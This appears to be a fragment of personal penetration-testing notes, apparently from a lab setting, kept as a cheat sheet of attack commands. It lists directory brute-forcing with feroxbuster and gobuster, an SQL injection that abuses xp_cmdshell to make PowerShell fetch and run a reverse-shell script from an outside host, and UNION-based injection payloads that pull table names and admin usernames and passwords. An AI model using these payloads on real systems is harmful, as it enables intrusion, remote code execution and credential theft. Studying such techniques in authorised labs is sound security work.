...
feroxbuster -u 'http://$IP' -w /usr/share/wordlists/dirb/big.txt
   ...
   #+begin_example
gobuster dir -t20 --wordlist /usr/share/wordlists/seclists/directory-list-2.3-medium.txt -u http://192.168.216.121 -x aspx
   #+end_example
...
' ; EXEC xp_cmdshell 'powershell -c "iex(new-object net.webclient).downloadstring(\"http://192.168.45.248:1337/Invoke-PowerShellTcp.ps1\")" '; --
    ...
    Union select
    #+begin_example
fieldname=' UNION SELECT 1,2,3 -- -
fieldname=' UNION SELECT 1,2,@@version) -- -
fieldname=' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables  WHERE table_schema=database() -- -
# We then should receive column names that we can concat to print out, Example : admin_password,admin_username,email,id
fieldname=' UNION SELECT 1,2,group_concat(admin_username,':',admin_password) FROM admin_auth -- -
    #+end_example
